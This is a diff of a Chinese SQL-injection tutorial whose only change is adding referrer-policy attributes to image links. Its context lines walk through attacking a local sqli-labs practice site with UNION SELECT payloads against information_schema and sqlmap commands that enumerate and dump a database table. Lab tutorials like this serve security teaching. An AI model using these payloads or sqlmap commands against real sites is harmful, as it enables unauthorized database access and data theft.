@@ -49,15 +49,15 @@ sqli-labs是一个开源的SQL注入平台，你可以从[GitHub](https://github
 
 运行sqli-labs需要PHP、Apache环境，如果你之前没有安装过它们，可以直接使用phpStudy这个工具，它不仅集成了PHP、Apache和MySQL，还可以方便地指定PHP的版本。在今天的项目中，我使用的是PHP5.4.45版本。
 
-![](https://static001.geekbang.org/resource/image/ec/f4/ecd7853d8aa4523735643d0aa67ce5f4.png?wh=835%2A685)  
+![](https://static001.geekbang.org/resource/image/ec/f4/ecd7853d8aa4523735643d0aa67ce5f4.png?wh=835%2A685)  {: referrerpolicy="no-referrer" }
 第三步，配置sqli-labs及MySQL参数。
 
 首先我们需要给sqli-labs指定需要访问的数据库账户密码，对应`sqli-labs-master\sql-connections\db-creds.inc`文件，这里我们需要修改`$dbpass`参数，改成自己的MySQL的密码。
 
-![](https://static001.geekbang.org/resource/image/a2/84/a2b0bcedf13d2f6d4d0e77553c4a9484.png?wh=1247%2A466)  
+![](https://static001.geekbang.org/resource/image/a2/84/a2b0bcedf13d2f6d4d0e77553c4a9484.png?wh=1247%2A466)  {: referrerpolicy="no-referrer" }
 此时我们访问本地的`sqli-labs`项目`http://localhost/sqli-labs-master/`出现如下页面，需要先启动数据库，选择`Setup/reset Database for labs`即可。
 
-![](https://static001.geekbang.org/resource/image/3d/a9/3d6bdc6a81df7ad708903a015233cba9.png?wh=1730%2A673)  
+![](https://static001.geekbang.org/resource/image/3d/a9/3d6bdc6a81df7ad708903a015233cba9.png?wh=1730%2A673)  {: referrerpolicy="no-referrer" }
 如果此时提示数据库连接错误，可能需要我们手动修改MySQL的配置文件，需要调整的参数如下所示（修改MySQL密码验证方式为使用明文，同时设置MySQL默认的编码方式）：
 
 ```
@@ -74,12 +74,12 @@ default_authentication_plugin = mysql_native_password
 
 在我们成功对sqli-labs进行了配置，现在可以进入到第一关挑战环节。访问本地的`http://localhost/sqli-labs-master/Less-1/`页面，如下所示：
 
-![](https://static001.geekbang.org/resource/image/42/74/4274d6de133192f7a1dd0348c75c0e74.png?wh=1316%2A200)  
+![](https://static001.geekbang.org/resource/image/42/74/4274d6de133192f7a1dd0348c75c0e74.png?wh=1316%2A200)  {: referrerpolicy="no-referrer" }
 我们可以在URL后面加上ID参数，获取指定ID的信息，比如`http://localhost/sqli-labs-master/Less-1/?id=1`。
 
 这些都是正常的访问请求，现在我们可以通过1 or 1=1来判断ID参数的查询类型，访问`http://localhost/sqli-labs-master/Less-1/?id=1 or 1=1`。
 
-![](https://static001.geekbang.org/resource/image/ea/41/eab6701bd0a40980b180d99e295b1841.png?wh=1103%2A344)  
+![](https://static001.geekbang.org/resource/image/ea/41/eab6701bd0a40980b180d99e295b1841.png?wh=1103%2A344)  {: referrerpolicy="no-referrer" }
 你可以看到依然可以正常访问，证明ID参数不是数值查询，然后我们在1后面增加个单引号，来查看下返回结果，访问`http://localhost/sqli-labs-master/Less-1/?id=1'`。
 
 这时数据库报错，并且在页面上返回了错误信息：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1。
@@ -114,7 +114,7 @@ http://localhost/sqli-labs-master/Less-1/?id=1' order by 3 --+
 
 这里我们使用UNION操作符。在MySQL中，UNION操作符前后两个SELECT语句的查询结构必须一致。刚才我们已经通过实验，判断出查询语句的字段个数为3，因此在构造UNION后面的查询语句时也需要查询3个字段。这里我们可以使用：`SELECT 1,database(),user()`，也就是使用默认值1来作为第一个字段，整个URL为：`http://localhost/sqli-labs-master/Less-1/?id=' union select 1,database(),user() --+`。
 
-![](https://static001.geekbang.org/resource/image/a1/cd/a186b5758d80983b4d34818169b719cd.png?wh=1241%2A350)  
+![](https://static001.geekbang.org/resource/image/a1/cd/a186b5758d80983b4d34818169b719cd.png?wh=1241%2A350)  {: referrerpolicy="no-referrer" }
 页面中显示的`security`即为当前的数据库名称，`root@localhost`为当前的用户信息。
 
 ### 获取MySQL中的所有数据库名称
@@ -129,7 +129,7 @@ http://localhost/sqli-labs-master/Less-1/?id=' union select 1,2,(SELECT GROUP_CO
 
 这样我们就可以把多个数据库名称拼接在一起，作为字段3返回给页面。
 
-![](https://static001.geekbang.org/resource/image/7e/a7/7e1aa81c623e28c87666cfdd290462a7.png?wh=1728%2A142%3Fwh%3D1728%2A142)  
+![](https://static001.geekbang.org/resource/image/7e/a7/7e1aa81c623e28c87666cfdd290462a7.png?wh=1728%2A142%3Fwh%3D1728%2A142)  {: referrerpolicy="no-referrer" }
 你能看到这里我使用到了MySQL中的`information_schema`数据库，这个数据库是MySQL自带的数据库，用来存储数据库的基本信息，比如数据库名称、数据表名称、列的数据类型和访问权限等。我们可以通过访问`information_schema`数据库，获得更多数据库的信息。
 
 ### 查询wucai数据库中所有数据表
@@ -142,7 +142,7 @@ http://localhost/sqli-labs-master/Less-1/?id=' UNION SELECT 1,2,(SELECT GROUP_CO
 
 这里我们同样将数据表名称使用GROUP\_CONCAT函数拼接起来，作为字段3进行返回。
 
-![](https://static001.geekbang.org/resource/image/7e/a7/7e1aa81c623e28c87666cfdd290462a7.png?wh=1728%2A142%3Fwh%3D1728%2A142)
+![](https://static001.geekbang.org/resource/image/7e/a7/7e1aa81c623e28c87666cfdd290462a7.png?wh=1728%2A142%3Fwh%3D1728%2A142){: referrerpolicy="no-referrer" }
 
 ### 查询heros数据表中所有字段名称
 
@@ -158,7 +158,7 @@ http://localhost/sqli-labs-master/Less-1/?id=' UNION SELECT 1,2,(SELECT GROUP_CO
 attack_growth,attack_max,attack_range,attack_speed_max,attack_start,birthdate,defense_growth,defense_max,defense_start,hp_5s_growth,hp_5s_max,hp_5s_start,hp_growth,hp_max,hp_start,id,mp_5s_growth,mp_5s_max,mp_5s_start,mp_growth,mp_max,mp_start,name,role_assist,role_main
 ```
 
-![](https://static001.geekbang.org/resource/image/f3/bf/f30c7a68fba4fd8eff3ea8370aca00bf.png?wh=1725%2A116)
+![](https://static001.geekbang.org/resource/image/f3/bf/f30c7a68fba4fd8eff3ea8370aca00bf.png?wh=1725%2A116){: referrerpolicy="no-referrer" }
 
 ## 使用SQLmap工具进行SQL注入检测
 
@@ -178,7 +178,7 @@ python sqlmap.py -u "http://localhost/sqli-labs-master/Less-1/?id=1" --current-d
 
 然后你能看到SQLmap帮我们获取了相应的结果：
 
-![](https://static001.geekbang.org/resource/image/42/05/42626ab164f9935e0c22ced9fa5f8105.png?wh=1097%2A219)
+![](https://static001.geekbang.org/resource/image/42/05/42626ab164f9935e0c22ced9fa5f8105.png?wh=1097%2A219){: referrerpolicy="no-referrer" }
 
 ### 获取MySQL中的所有数据库名称
 
@@ -190,7 +190,7 @@ python sqlmap.py -u "http://localhost/sqli-labs-master/Less-1/?id=1" --threads=5
 
 同样SQLmap帮我们获取了MySQL中存在的8个数据库名称：
 
-![](https://static001.geekbang.org/resource/image/b9/53/b9f9b624e863cd507c1cb1c4b1fc1853.png?wh=1284%2A1125)
+![](https://static001.geekbang.org/resource/image/b9/53/b9f9b624e863cd507c1cb1c4b1fc1853.png?wh=1284%2A1125){: referrerpolicy="no-referrer" }
 
 ### 查询wucai数据库中所有数据表
 
@@ -200,7 +200,7 @@ python sqlmap.py -u "http://localhost/sqli-labs-master/Less-1/?id=1" --threads=5
 python sqlmap.py -u "http://localhost/sqli-labs-master/Less-1/?id=1" --threads=5 -D wucai --tables
 ```
 
-![](https://static001.geekbang.org/resource/image/11/16/119174ae050e5a27e70ebc5537d7b116.png?wh=525%2A750)
+![](https://static001.geekbang.org/resource/image/11/16/119174ae050e5a27e70ebc5537d7b116.png?wh=525%2A750){: referrerpolicy="no-referrer" }
 
 ### 查询heros数据表中所有字段名称
 
@@ -210,7 +210,7 @@ python sqlmap.py -u "http://localhost/sqli-labs-master/Less-1/?id=1" --threads=5
 python sqlmap.py -u "http://localhost/sqli-labs-master/Less-1/?id=1" --threads=5 -D wucai -T heros --columns
 ```
 
-![](https://static001.geekbang.org/resource/image/68/6d/681d394e31a6ac44ac85f2349282886d.png?wh=913%2A1613)
+![](https://static001.geekbang.org/resource/image/68/6d/681d394e31a6ac44ac85f2349282886d.png?wh=913%2A1613){: referrerpolicy="no-referrer" }
 
 ### 查询heros数据表中的英雄信息
 
@@ -220,7 +220,7 @@ python sqlmap.py -u "http://localhost/sqli-labs-master/Less-1/?id=1" --threads=5
 python sqlmap.py -u "http://localhost/sqli-labs-master/Less-1/?id=1" -D wucai -T heros -C id,name,hp_max --dump
 ```
 
-![](https://static001.geekbang.org/resource/image/ce/33/ced56f2e12f6c1afccadac6be231a533.png?wh=750%2A1100)  
+![](https://static001.geekbang.org/resource/image/ce/33/ced56f2e12f6c1afccadac6be231a533.png?wh=750%2A1100)  {: referrerpolicy="no-referrer" }
 完整的结果一共包括69个英雄信息都显示出来了，这里我只截取了部分的英雄结果。
 
 ## 总结
